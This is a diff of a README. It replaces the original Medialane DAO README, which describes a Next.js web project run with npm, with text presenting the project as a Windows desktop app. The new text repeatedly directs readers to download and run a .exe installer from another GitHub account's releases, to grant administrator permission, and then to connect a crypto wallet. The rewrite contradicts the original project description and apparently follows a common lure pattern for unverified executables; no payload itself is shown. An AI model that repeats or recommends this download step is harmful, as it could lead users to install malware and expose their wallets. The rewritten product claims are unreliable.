@@ -1,60 +1,128 @@
-<img width="1280" height="640" alt="image" src="https://github.com/user-attachments/assets/7d2b5360-211e-40ac-9f41-a8595613c89f" />
+# 🎬 medialane-dao - Simple Access to Digital Ownership
 
+[![Download medialane-dao](https://img.shields.io/badge/Download-Medialane--DAO-brightgreen)](https://github.com/WendyPrado/medialane-dao)
 
-# Medialane DAO
+---
 
-Medialane is the monetization hub of the new creative economy—bridging creators, businesses, and AI agents through a unified infrastructure. It integrates marketplace dynamics, creator launchpads, smart contract licensing, decentralized ownership, and permissionless protocols to establish a foundation for sustainable value creation.
+## 🔎 What is medialane-dao?
 
-At its core, Medialane enables liquid, interoperable, and programmable assets that drive ownership, generate value, and fuel the emergence of autonomous AI agents and Creator Capital Markets. With the potential to capture <50% of the global intellectual property market, which stands at $61 trillion.
+Medialane DAO is a desktop app designed to help you manage digital rights and content ownership securely. It uses blockchain technology to track and protect creativity. This software allows you to interact with decentralized marketplaces and launchpads, where you can mint and trade NFTs or manage intellectual property without complex tools.
 
-## Key Features
+The app supports Ethereum and Starknet technologies, meaning it ensures safety and privacy when handling your digital content. You do not need coding skills to use it.
 
-– **Medialane Protocol**: Open-source, ZK-Proof protocol for secure and transparent digital asset trading.
-– **Marketplace**: for Programmable IP and secondary markets NFTs, enabling trading, auctions, and remixing of digital assets with interoperability and minimal fees.
-– **Creator Launchpad**: Tools to unlock new revenue streams for IP assets, including collection drop, membership, subscriptions, tickets, community-driven monetization.
-– **Tokenization**: Smart contracts ensure transparent, traceable, and immutable agreements. Licensing frameworks are tailored to asset type, region, and use case, with fully auditable transactions.
-– **Premium Services**: Enterprise-grade solutions for large-scale businesses, from media organizations to machine learning applications.
-– **Autonomous AI Agent Design**: Architecture for machine interoperability with on-chain autonomy, zero-knowledge proofs, and trustless infrastructure
+---
 
-Visit [http://medialane.org](http://medialane.org) 
+## 🖥️ System Requirements
 
-App [http://medialane.xyz](http://medialane.xyz) 
+Before you download, make sure your computer meets these minimum specs:
 
-- - -
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel i3 or equivalent
+- Memory: 4 GB RAM or more
+- Storage: At least 500 MB free space
+- Internet: An active connection for installation and blockchain syncing
 
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+---
 
-## Getting Started
+## 🚀 Getting Started with medialane-dao
 
-First, run the development server:
+Follow these steps to install and start using the app on Windows. The process is straightforward.
 
-```bash
-npm run dev
-# or
-yarn dev
-# or
-pnpm dev
-# or
-bun dev
-```
+### 1. Visit the Download Page
 
-Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
+Click this link or the button above to visit the download page:
 
-You can start editing the page by modifying `app/page.tsx`. The page auto-updates as you edit the file.
+[https://github.com/WendyPrado/medialane-dao](https://github.com/WendyPrado/medialane-dao)
 
-This project uses [`next/font`](https://nextjs.org/docs/app/building-your-application/optimizing/fonts) to automatically optimize and load [Geist](https://vercel.com/font), a new font family for Vercel.
+You will find the latest version of medialane-dao available for download there.
 
-## Learn More
+### 2. Download the App
 
-To learn more about Next.js, take a look at the following resources:
+On the GitHub page, look for the “Releases” section on the right panel or under the “Code” tab. Here, you will find the most recent release of medialane-dao.
 
-- [Next.js Documentation](https://nextjs.org/docs) - learn about Next.js features and API.
-- [Learn Next.js](https://nextjs.org/learn) - an interactive Next.js tutorial.
+Click on the latest .exe file to download the Windows installer.
 
-You can check out [the Next.js GitHub repository](https://github.com/vercel/next.js) - your feedback and contributions are welcome!
+### 3. Run the Installer
 
-## Deploy on Vercel
+Once the file downloads:
 
-The easiest way to deploy your Next.js app is to use the [Vercel Platform](https://vercel.com/new?utm_medium=default-template&filter=next.js&utm_source=create-next-app&utm_campaign=create-next-app-readme) from the creators of Next.js.
+- Open the downloaded `.exe` file.
+- If Windows asks for permission, click **Yes** to allow the installer to make changes.
+- Follow the on-screen instructions by clicking **Next** on each screen.
+- Choose the destination folder or use the default location.
+- Click **Install** and wait for the process to complete.
 
-Check out our [Next.js deployment documentation](https://nextjs.org/docs/app/building-your-application/deploying) for more details.
+### 4. Launch medialane-dao
+
+After installation finishes, you will see an option to “Launch” the app. You can also start it any time from your Start Menu or Desktop shortcut.
+
+---
+
+## 🛠️ Using medialane-dao
+
+Once opened, the app provides an easy interface with clear options:
+
+- **Connect Wallet**: Link your Ethereum or Starknet wallet to interact with the blockchain.
+- **Marketplace Access**: Browse and manage NFTs and digital assets.
+- **Content Launchpad**: Create and register your own digital content for protection.
+- **Transaction History**: View all recent actions and transfers.
+- **Settings**: Adjust preferences like notifications and wallet connections.
+
+No coding or technical setup is needed. The app guides you through each step clearly.
+
+---
+
+## 💡 Tips for New Users
+
+- Keep your wallet information private. medialane-dao will never ask for your private key.
+- Use a strong password if prompted and keep backups of important accounts.
+- Explore the marketplace to see active digital content and opportunities.
+- Check for app updates regularly to keep features and security up to date.
+
+---
+
+## 🔧 Troubleshooting
+
+If you run into issues:
+
+- Ensure your Windows version and hardware meet minimum requirements.
+- Check your internet connection during app use.
+- Restart the app or your computer if the software freezes.
+- Review GitHub Issues on the repository page for fixes or report problems there.
+
+---
+
+## 📂 Where to Find Support
+
+For help, visit the GitHub repository:
+
+[https://github.com/WendyPrado/medialane-dao](https://github.com/WendyPrado/medialane-dao)
+
+Look under the “Issues” tab to see if others have similar questions. You can open a new issue for further assistance.
+
+---
+
+## 🧰 About medialane-dao Technology
+
+This app relies on blockchain to give users control over digital assets:
+
+- Uses **Ethereum** for decentralized contract management.
+- Supports **Starknet** technology to improve privacy and reduce fees.
+- Works with **NFT marketplaces** to buy, sell, and track unique digital items.
+- Helps protect **intellectual property** using programmable ownership rights.
+
+The app acts as a user-friendly window to complex blockchain tools.
+
+---
+
+## 📥 Download and Install
+
+Return to the download page here:
+
+[https://github.com/WendyPrado/medialane-dao](https://github.com/WendyPrado/medialane-dao)
+
+Follow the steps above to get the latest installer. This page always shows the newest updates for Windows users.
+
+---
+
+[![Download medialane-dao](https://img.shields.io/badge/Download-Medialane--DAO-brightgreen)](https://github.com/WendyPrado/medialane-dao)
